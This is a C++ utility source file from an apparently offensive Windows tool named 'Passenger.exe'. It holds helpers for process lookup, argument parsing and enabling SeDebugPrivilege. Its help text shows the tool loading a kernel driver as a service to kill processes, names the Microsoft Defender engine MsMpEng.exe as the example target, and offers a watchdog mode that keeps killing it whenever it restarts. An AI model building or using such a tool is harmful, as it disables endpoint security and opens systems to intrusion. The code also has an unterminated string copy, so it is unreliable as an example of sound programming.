#include "Utils.h"
#pragma warning(disable:4996)

BOOL getProcessNameById(ULONG pid, WCHAR* procName)
{
	// Returns True or False based on sucess, populate ProcName passes as arg2 with the value of the executable name corresponds to the given PID in arg1

	DWORD ProcID = 0;
	BOOL res = FALSE;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (entry.th32ProcessID == pid)
			{
				//procName = *entry.szExeFile;
				wcsncpy(procName, entry.szExeFile, wcslen(entry.szExeFile));
				res = TRUE;
				break;
			}
		}
	}
	CloseHandle(snapshot);
	return res;
}

DWORD getProcessIdByName(WCHAR* ProcName)
{
	// Returns the PID, given ProcessName	

	PROCESSENTRY32 entry = { 0 };
	DWORD pidFromName = 0;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (wcscmp(entry.szExeFile, ProcName) == 0)
			{
				pidFromName = entry.th32ProcessID;
				break;
			}
		}
	}
	CloseHandle(snapshot);
	return pidFromName;
}

char* getCmdParam(char** begin, char** end, const std::string& option)
{
	char** itr = std::find(begin, end, option);
	if (itr != end && ++itr != end)
	{
		return *itr;
	}
	return 0;
}

bool cmdParamExists(char** begin, char** end, const std::string& option)
{
	return std::find(begin, end, option) != end;
}

void print_help()
{
	printf("\nUsage: Passenger.exe { /install <DRIVER_FILE_FULL_PATH> || /service <SERVICE_NAME>} {/pid <PID> || /name <PROCNAME.exe>} [/watchdog]\n\n");
	printf("=== Help ===\n");
	printf("/install - Full Path to the Driver file to be install.\n");
	printf("/service -\n\tWith /install - Arbitrary name for the new service\n\tWithout /install - An existing service name (Will start the service if needed)\n");
	printf("/pid - Target Process Id\n");
	printf("/name - Target Process Name\n");
	printf("/watchdog - Monitor the service, if it comes up again - kill it\n\n");

	printf("=== Examples ===\n");
	printf("[!] Load driver at C:\\driver.sys as service with the name nonsense and kill process with id 123\n");
	printf("Passenger.exe /install C:\\driver.sys /service nonsense /pid 123\n\n");

	printf("[!] Start the service nonsense and kill process with name MsMpEng.exe\n");
	printf("Passenger.exe /service nonsense /name MsMpEng.exe\n\n");

	printf("[!] Start the service nonsense and kill process with id 123. Keep monitor the process (By its name), kill it everytime it is up again\n");
	printf("Passenger.exe /service nonsense /pid 123 /watchdog\n\n");
	exit(0);
}

BOOL SetDebugPrivilege() {
	
	HANDLE hToken = NULL;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("[-] Failed to get current process token. (Error Code: %lu)\n", GetLastError());
		return FALSE;
	}

	TOKEN_PRIVILEGES tp = { 0 };
	LUID luid = { 0 };

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
		printf("[-] LookupPrivilegeValue failed. (Error Code: %lu)\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		printf("[-] AdjustTokenPrivileges Failed. (Error Code: %lu)\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		printf("[-] Token does not have the specified privilege.\n");
		return FALSE;
	}

	return TRUE;
}